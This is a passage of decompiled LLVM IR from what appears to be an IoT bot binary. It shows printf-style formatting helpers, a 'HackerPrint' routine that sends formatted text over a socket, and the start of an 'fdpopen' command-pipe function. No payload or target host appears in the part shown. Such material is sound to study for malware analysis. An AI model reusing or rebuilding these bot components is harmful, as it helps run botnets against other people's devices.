  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bfb0.35, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8d58 = load i32, i32* @r2, align 4
  store i32 %v6_8d58, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  %v1_8e08 = call i32 @free(i32 %v1_8d70)
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_2cc5c.37, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

